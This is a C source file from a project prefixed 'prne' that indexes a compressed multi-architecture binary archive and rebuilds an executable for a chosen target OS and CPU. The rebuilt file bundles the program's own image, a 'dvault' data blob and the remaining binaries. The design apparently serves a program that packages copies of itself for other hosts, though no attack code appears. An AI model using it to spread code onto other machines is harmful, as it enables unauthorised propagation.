/*
* Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#include "pack.h"
#include "util_ct.h"
#include "util_rt.h"
#include "endian.h"
#include "config.h"

#include <string.h>
#include <errno.h>


typedef struct {
	const uint8_t *data;
	size_t rem;
} pack_rcb_pt_octx_t;

typedef struct {
	uint8_t buf[4096];
	const uint8_t *m_dv;
	size_t dv_len;
	size_t ofs;
	const prne_bin_tuple_t *t;
	const prne_bin_archive_t *ba;
	size_t buf_len; // 0: used as z_stream buffer, > 0: used as something else
	size_t seek, skip; // Offset to binary to exclude and its length
	z_stream z_old, z_ny;
	prne_bin_host_t self;
} pack_rcb_rb_octx_t;

bool prne_eq_bin_host (const prne_bin_host_t *a, const prne_bin_host_t *b) {
	return
		a->os == b->os &&
		a->arch == b->arch;
}

bool prne_bin_host_inrange (const prne_bin_host_t *x) {
	return
		prne_os_inrange(x->os) &&
		prne_arch_inrange(x->arch);
}

void prne_init_bin_archive (prne_bin_archive_t *a) {
	prne_memzero(a, sizeof(prne_bin_archive_t));
}

void prne_free_bin_archive (prne_bin_archive_t *a) {
	prne_free(a->bin);
	a->bin = NULL;
	a->nb_bin = 0;
}

prne_pack_rc_t prne_index_bin_archive (
	const uint8_t *data,
	size_t len,
	prne_bin_archive_t *out)
{
	prne_pack_rc_t ret = PRNE_PACK_RC_OK;
	prne_bin_tuple_t *bin = NULL;
	size_t nb_bin, i, sum = 0;

	if (len < 8 ||
		memcmp(
			data,
			PRNE_PACK_BA_IDEN_DATA,
			sizeof(PRNE_PACK_BA_IDEN_DATA)) != 0)
	{
		ret = PRNE_PACK_RC_FMT_ERR;
		goto END;
	}
	if (data[5] != 0) {
		ret = PRNE_PACK_RC_UNIMPL_REV;
		goto END;
	}
	nb_bin = prne_recmb_msb16(data[6], data[7]);
	len -= 8;
	data += 8;
	if (nb_bin * 8 > len) {
		ret = PRNE_PACK_RC_FMT_ERR;
		goto END;
	}

	// An empty bin archive is possible.
	bin = (prne_bin_tuple_t*)prne_malloc(sizeof(prne_bin_tuple_t), nb_bin);
	if (bin == NULL && nb_bin > 0) {
		ret = PRNE_PACK_RC_ERRNO;
		goto END;
	}

	for (i = 0; i < nb_bin; i += 1) {
		bin[i].host.os = (prne_os_t)data[2];
		bin[i].host.arch = (prne_arch_t)data[3];
		bin[i].size = prne_recmb_msb32(0, data[5], data[6], data[7]);
		sum += bin[i].size;
		data += 8;
		len -= 8;
	}

	prne_free_bin_archive(out);
	out->data = data;
	out->data_size = len;
	out->nb_bin = nb_bin;
	out->bin = bin;
	bin = NULL;

END:
	prne_free(bin);
	return ret;
}

void prne_init_bin_rcb_ctx (prne_bin_rcb_ctx_t *ctx) {
	prne_memzero(ctx, sizeof(prne_bin_rcb_ctx_t));
}

void prne_free_bin_rcb_ctx (prne_bin_rcb_ctx_t *ctx) {
	ctx->read_f = NULL;
	if (ctx->o_ctx != NULL) {
		ctx->ctx_free_f(ctx->o_ctx);
		ctx->o_ctx = NULL;
		ctx->ctx_free_f = NULL;
	}
}

void pack_rcb_free_pt_octx (void *p) {
	prne_free(p);
}

void pack_rcb_free_rb_octx (void *p) {
	pack_rcb_rb_octx_t *ctx = (pack_rcb_rb_octx_t*)p;

	inflateEnd(&ctx->z_old);
	deflateEnd(&ctx->z_ny);
	prne_free(ctx);
}

static ssize_t pack_rcb_nullread_f (
	prne_bin_rcb_ctx_t *ctx,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *prc,
	int *err)
{
	prne_chk_assign(prc, PRNE_PACK_RC_EOF);
	prne_chk_assign(err, 0);
	return 0;
}

static ssize_t pack_rcb_ptread_f (
	prne_bin_rcb_ctx_t *ctx_p,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *prc,
	int *err)
{
	pack_rcb_pt_octx_t *ctx = (pack_rcb_pt_octx_t*)ctx_p->o_ctx;
	const size_t consume = prne_op_min(len, ctx->rem);

	memcpy(buf, ctx->data, consume);
	ctx->data += consume;
	ctx->rem -= consume;

	if (ctx->rem == 0) {
		ctx_p->read_f = pack_rcb_nullread_f;
		ctx_p->ctx_free_f(ctx);
		ctx_p->o_ctx = NULL;
		ctx_p->ctx_free_f = NULL;
	}

	prne_chk_assign(prc, PRNE_PACK_RC_OK);
	prne_chk_assign(err, 0);
	return consume;
}

static ssize_t pack_rcb_rpread_f (
	prne_bin_rcb_ctx_t *ctx_p,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *out_prc,
	int *out_err)
{
	prne_pack_rc_t prc = PRNE_PACK_RC_OK;
	int err = 0;
	pack_rcb_rb_octx_t *ctx = (pack_rcb_rb_octx_t*)ctx_p->o_ctx;
	size_t consume;

	if (ctx->buf_len > 0) {
		// alignment and index
		consume = prne_op_min(ctx->buf_len, len);
		memcpy(buf, ctx->buf, consume);
		memmove(ctx->buf, ctx->buf + consume, ctx->buf_len - consume);
		ctx->buf_len -= consume;
	}
	else {
		int d_flush = Z_NO_FLUSH;

		if (ctx->z_ny.avail_in == 0) {
			if (ctx->seek > 0) {
				consume = prne_op_min(sizeof(ctx->buf), ctx->seek);
			}
			else if (ctx->skip > 0) {
				consume = prne_op_min(sizeof(ctx->buf), ctx->skip);
			}
			else {
				consume = sizeof(ctx->buf);
			}
			ctx->z_old.avail_out = consume;
			ctx->z_old.next_out = ctx->buf;
			err = inflate(&ctx->z_old, Z_FINISH);
			switch (err) {
			case Z_STREAM_END:
				d_flush = Z_FINISH;
				/* fall-through */
			case Z_BUF_ERROR:
			case Z_OK:
				err = 0;
				break;
			default:
				consume = -1;
				prc = PRNE_PACK_RC_Z_ERR;
				goto END;
			}

			consume -= ctx->z_old.avail_out;
			if (ctx->seek > 0) {
				ctx->seek -= consume;
			}
			else if (ctx->skip > 0) {
				ctx->skip -= consume;
				consume = 0;
				goto END;
			}
			ctx->z_ny.next_in = ctx->buf;
			ctx->z_ny.avail_in = consume;

			if (consume == 0 && d_flush != Z_FINISH) {
				// short compressed data
				// this means that bin arch is incomplete
				consume = -1;
				prc = PRNE_PACK_RC_FMT_ERR;
				goto END;
			}
		}

		ctx->z_ny.avail_out = len;
		ctx->z_ny.next_out = buf;
		err = deflate(&ctx->z_ny, d_flush);
		switch (err) {
		case Z_STREAM_END:
			ctx_p->read_f = pack_rcb_nullread_f;
			/* fall-through */
		case Z_BUF_ERROR:
		case Z_OK:
			err = 0;
			break;
		default:
			consume = -1;
			prc = PRNE_PACK_RC_Z_ERR;
			goto END;
		}
		consume = len - ctx->z_ny.avail_out;
	}
END:
	prne_chk_assign(out_prc, prc);
	prne_chk_assign(out_err, err);
	return consume;
}

static ssize_t pack_rcb_dvread_f (
	prne_bin_rcb_ctx_t *ctx_p,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *out_prc,
	int *out_err)
{
	pack_rcb_rb_octx_t *ctx = (pack_rcb_rb_octx_t*)ctx_p->o_ctx;
	size_t consume;

	if (ctx->buf_len > 0) {
		// alignment and appendix
		consume = prne_op_min(ctx->buf_len, len);
		memcpy(buf, ctx->buf, consume);
		memmove(ctx->buf, ctx->buf + consume, ctx->buf_len - consume);
		ctx->buf_len -= consume;
	}
	else {
		size_t nb_bin = 0;
		// dv
		consume = prne_op_min(ctx->skip, len);
		memcpy(buf, ctx->m_dv, consume);
		ctx->skip -= consume;
		ctx->m_dv += consume;

		if (ctx->skip == 0) {
			prne_bin_tuple_t *t;
			uint8_t *nb_bin_loc;

			// alignment and bin archive index
			prne_static_assert(
				sizeof(ctx->buf) >=
					PRNE_BIN_ALIGNMENT + (NB_PRNE_OS * NB_PRNE_ARCH) * 8,
				"FIXME");
			ctx->buf_len =
				prne_salign_next(ctx->dv_len, PRNE_BIN_ALIGNMENT)
				- ctx->dv_len;
			prne_memzero(ctx->buf, ctx->buf_len);

			memcpy(
				ctx->buf + ctx->buf_len,
				PRNE_PACK_BA_IDEN_DATA,
				sizeof(PRNE_PACK_BA_IDEN_DATA));
			ctx->buf[ctx->buf_len + 5] = 0;
			nb_bin_loc = ctx->buf + ctx->buf_len + 6;
			ctx->buf_len += 8;

			if (prne_bin_host_inrange(&ctx->self)) {
				ctx->buf[ctx->buf_len + 0] = 0;
				ctx->buf[ctx->buf_len + 1] = 0;
				ctx->buf[ctx->buf_len + 2] = (uint8_t)ctx->self.os;
				ctx->buf[ctx->buf_len + 3] = (uint8_t)ctx->self.arch;
				ctx->buf[ctx->buf_len + 4] = 0;
				ctx->buf[ctx->buf_len + 5] =
					prne_getmsb32(ctx->z_ny.avail_in, 1);
				ctx->buf[ctx->buf_len + 6] =
					prne_getmsb32(ctx->z_ny.avail_in, 2);
				ctx->buf[ctx->buf_len + 7] =
					prne_getmsb32(ctx->z_ny.avail_in, 3);
				ctx->buf_len += 8;
				nb_bin += 1;
			}

			for (size_t i = 0; i < ctx->ba->nb_bin; i += 1) {
				t = ctx->ba->bin + i;

				if (prne_eq_bin_host(&t->host, &ctx->t->host)) {
					continue;
				}
				ctx->buf[ctx->buf_len + 0] = 0;
				ctx->buf[ctx->buf_len + 1] = 0;
				ctx->buf[ctx->buf_len + 2] = (uint8_t)t->host.os;
				ctx->buf[ctx->buf_len + 3] = (uint8_t)t->host.arch;
				ctx->buf[ctx->buf_len + 4] = 0;
				ctx->buf[ctx->buf_len + 5] = prne_getmsb32(t->size, 1);
				ctx->buf[ctx->buf_len + 6] = prne_getmsb32(t->size, 2);
				ctx->buf[ctx->buf_len + 7] = prne_getmsb32(t->size, 3);
				ctx->buf_len += 8;
				nb_bin += 1;
			}

			nb_bin_loc[0] = prne_getmsb16(nb_bin, 0);
			nb_bin_loc[1] = prne_getmsb16(nb_bin, 1);
			ctx->seek = ctx->ofs;
			ctx->skip = ctx->t->size;
			ctx_p->read_f = pack_rcb_rpread_f;
		}
	}

	prne_chk_assign(out_prc, PRNE_PACK_RC_OK);
	prne_chk_assign(out_err, 0);
	return consume;
}

static ssize_t pack_rcb_eeread_f (
	prne_bin_rcb_ctx_t *ctx_p,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *out_prc,
	int *out_err)
{
	prne_pack_rc_t prc = PRNE_PACK_RC_OK;
	int err = 0;
	pack_rcb_rb_octx_t *ctx = (pack_rcb_rb_octx_t*)ctx_p->o_ctx;
	size_t consume;

	if (ctx->seek > 0) {
		ctx->z_old.avail_out = prne_op_min(sizeof(ctx->buf), ctx->seek);
		ctx->z_old.next_out = ctx->buf;
	}
	else {
		ctx->z_old.avail_out = prne_op_min(len, ctx->skip);
		ctx->z_old.next_out = buf;
	}
	consume = ctx->z_old.avail_out;
	err = inflate(&ctx->z_old, Z_FINISH);
	switch (err) {
	case Z_STREAM_END:
	case Z_BUF_ERROR:
	case Z_OK:
		err = 0;
		break;
	default:
		consume = -1;
		prc = PRNE_PACK_RC_Z_ERR;
		goto END;
	}

	consume -= ctx->z_old.avail_out;
	if (ctx->seek > 0) {
		ctx->seek -= consume;
		consume = 0;
	}
	else {
		ctx->skip -= consume;

		if (ctx->skip == 0) {
			// alignment and appendix
			const size_t aligned = prne_salign_next(
				ctx->t->size,
				PRNE_BIN_ALIGNMENT);

			if ((err = inflateEnd(&ctx->z_old)) != Z_OK ||
				(err = inflateInit(&ctx->z_old)) != Z_OK)
			{
				prc = PRNE_PACK_RC_Z_ERR;
				goto END;
			}
			err = 0;
			ctx->z_old.avail_in = ctx->ba->data_size;
			ctx->z_old.next_in = (uint8_t*)ctx->ba->data;

			prne_static_assert(
				sizeof(ctx->buf) >= PRNE_BIN_ALIGNMENT + 8,
				"FIXME");

			ctx->buf_len = aligned - ctx->t->size;
			prne_memzero(ctx->buf, ctx->buf_len);
			ctx->buf[ctx->buf_len + 0] = prne_getmsb16(ctx->dv_len, 0);
			ctx->buf[ctx->buf_len + 1] = prne_getmsb16(ctx->dv_len, 1);
			ctx->buf[ctx->buf_len + 2] = 0;
			ctx->buf[ctx->buf_len + 3] = 0;
			ctx->buf[ctx->buf_len + 4] = 0;
			ctx->buf[ctx->buf_len + 5] = 0;
			ctx->buf[ctx->buf_len + 6] = 0;
			ctx->buf[ctx->buf_len + 7] = 0;
			ctx->buf_len += 8;
			ctx->skip = ctx->dv_len;

			ctx_p->read_f = pack_rcb_dvread_f;
		}
	}

END:
	prne_chk_assign(out_prc, prc);
	prne_chk_assign(out_err, err);
	return consume;
}

prne_pack_rc_t prne_start_bin_rcb (
	prne_bin_rcb_ctx_t *ctx,
	const prne_bin_host_t target,
	const prne_bin_host_t *self,
	const uint8_t *m_self,
	const size_t self_len,
	const size_t exec_len,
	const uint8_t *m_dvault,
	const size_t dvault_len,
	const prne_bin_archive_t *ba)
{
	if (!prne_bin_host_inrange(&target) ||
		(self != NULL && !prne_bin_host_inrange(self)))
	{
		return PRNE_PACK_RC_INVAL;
	}

	if (self != NULL && prne_eq_bin_host(self, &target)) {
		pack_rcb_pt_octx_t *ny_ctx =
			(pack_rcb_pt_octx_t*)prne_malloc(sizeof(pack_rcb_pt_octx_t), 1);

		if (ny_ctx == NULL) {
			return PRNE_PACK_RC_ERRNO;
		}

		ny_ctx->data = m_self;
		ny_ctx->rem = self_len;

		prne_free_bin_rcb_ctx(ctx);
		ctx->ctx_free_f = pack_rcb_free_pt_octx;
		ctx->o_ctx = ny_ctx;
		ctx->read_f = pack_rcb_ptread_f;
	}
	else {
		pack_rcb_rb_octx_t *ny_ctx = NULL;
		prne_bin_tuple_t *t = NULL;
		size_t seek = 0;

		if (ba == NULL) {
			return PRNE_PACK_RC_INVAL;
		}

		for (size_t i = 0; i < ba->nb_bin; i += 1) {
			if (prne_eq_bin_host(&ba->bin[i].host, &target)) {
				t = &ba->bin[i];
				break;
			}
			seek += ba->bin[i].size;
		}
		if (t == NULL) {
			return PRNE_PACK_RC_NO_ARCH;
		}

		ny_ctx =
			(pack_rcb_rb_octx_t*)prne_calloc(sizeof(pack_rcb_rb_octx_t), 1);
		if (ny_ctx == NULL) {
			return PRNE_PACK_RC_ERRNO;
		}

		if (inflateInit(&ny_ctx->z_old) != Z_OK ||
			deflateInit(&ny_ctx->z_ny, PRNE_PACK_Z_LEVEL) != Z_OK)
		{
			inflateEnd(&ny_ctx->z_old);
			deflateEnd(&ny_ctx->z_ny);
			prne_free(ny_ctx);
			return PRNE_PACK_RC_Z_ERR;
		}
		ny_ctx->m_dv = m_dvault;
		ny_ctx->dv_len = dvault_len;
		ny_ctx->ofs = seek;
		ny_ctx->t = t;
		ny_ctx->ba = ba;
		ny_ctx->seek = seek;
		ny_ctx->skip = t->size;

		ny_ctx->z_old.avail_in = ba->data_size;
		ny_ctx->z_old.next_in = (uint8_t*)ba->data;
		if (self != NULL) {
			ny_ctx->self = *self;
			ny_ctx->z_ny.avail_in = exec_len;
			ny_ctx->z_ny.next_in = (uint8_t*)m_self;
		}

		prne_free_bin_rcb_ctx(ctx);
		ctx->ctx_free_f = pack_rcb_free_rb_octx;
		ctx->o_ctx = ny_ctx;
		ctx->read_f = pack_rcb_eeread_f;
	}

	return PRNE_PACK_RC_OK;
}

prne_pack_rc_t prne_start_bin_rcb_compat (
	prne_bin_rcb_ctx_t *ctx,
	const prne_bin_host_t target,
	const prne_bin_host_t *self,
	const uint8_t *m_self,
	const size_t self_len,
	const size_t exec_len,
	const uint8_t *m_dvault,
	const size_t dvault_len,
	const prne_bin_archive_t *ba,
	prne_bin_host_t *actual)
{
	prne_bin_host_t a = target;
	prne_pack_rc_t ret = prne_start_bin_rcb(
		ctx,
		target,
		self,
		m_self,
		self_len,
		exec_len,
		m_dvault,
		dvault_len,
		ba);
	const prne_arch_t *f;

	if (ret != PRNE_PACK_RC_NO_ARCH) {
		goto END;
	}
	f = prne_compat_arch(target.arch);
	if (f == NULL) {
		goto END;
	}

	for (; *f != PRNE_ARCH_NONE; f += 1) {
		if (*f == target.arch) {
			continue;
		}
		a.arch = *f;
		ret = prne_start_bin_rcb(
			ctx,
			a,
			self,
			m_self,
			self_len,
			exec_len,
			m_dvault,
			dvault_len,
			ba);
		if (ret != PRNE_PACK_RC_NO_ARCH) {
			break;
		}
	}

END:
	prne_chk_assign(actual, a);
	return ret;
}

ssize_t prne_bin_rcb_read (
	prne_bin_rcb_ctx_t *ctx,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *prc,
	int *err)
{
	return ctx->read_f(ctx, buf, len, prc, err);
}

bool prne_index_nybin (
	const uint8_t *m_nybin,
	const size_t nybin_len,
	const uint8_t **m_dv,
	size_t *dv_len,
	const uint8_t **m_ba,
	size_t *ba_len)
{
	if (nybin_len < 8) {
		errno = EPROTO;
		return false;
	}
	if (memcmp(
			m_nybin + 2,
			PRNE_PACK_NYBIN_IDEN_DATA,
			sizeof(PRNE_PACK_NYBIN_IDEN_DATA)) != 0)
	{
		errno = EPROTO;
		return false;
	}
	if (m_nybin[7] != 0) {
		errno = ENOSYS;
		return false;
	}
	*dv_len = prne_recmb_msb16(m_nybin[0], m_nybin[1]);
	if (8 + *dv_len > nybin_len) {
		errno = EPROTO;
		return false;
	}
	*m_dv = m_nybin + 8;
	*m_ba = m_nybin + 8 + prne_salign_next(*dv_len, PRNE_BIN_ALIGNMENT);
	*ba_len = nybin_len - (*m_ba - m_nybin);

	return true;
}

void prne_init_rcb_param (prne_rcb_param_t *rp) {
	prne_memzero(rp, sizeof(prne_rcb_param_t));
}

void prne_free_rcb_param (prne_rcb_param_t *rp) {}

const prne_arch_t *prne_compat_arch (const prne_arch_t target) {
	static const prne_arch_t F_X86[] = {
		PRNE_ARCH_X86_64,
		PRNE_ARCH_I686,
		PRNE_ARCH_NONE
	};
	static const prne_arch_t F_ARM[] = {
		PRNE_ARCH_AARCH64,
		PRNE_ARCH_ARMV7,
		PRNE_ARCH_ARMV4T,
		PRNE_ARCH_NONE
	};

	switch (target) {
	case PRNE_ARCH_X86_64: return F_X86;
	case PRNE_ARCH_I686: return F_X86 + 1;
	case PRNE_ARCH_AARCH64: return F_ARM;
	case PRNE_ARCH_ARMV7: return F_ARM + 1;
	case PRNE_ARCH_ARMV4T: return F_ARM + 2;
	}
	return NULL;
}

const char *prne_pack_rc_tostr (const prne_pack_rc_t prc) {
	switch (prc) {
	case PRNE_PACK_RC_OK: return "ok";
	case PRNE_PACK_RC_EOF: return "eof";
	case PRNE_PACK_RC_INVAL: return "invalid";
	case PRNE_PACK_RC_FMT_ERR: return "format error";
	case PRNE_PACK_RC_ERRNO: return "errno";
	case PRNE_PACK_RC_Z_ERR: return "zlib error";
	case PRNE_PACK_RC_NO_ARCH: return "no arch";
	case PRNE_PACK_RC_UNIMPL_REV: return "unimpl rev";
	}
	errno = EINVAL;
	return NULL;
}
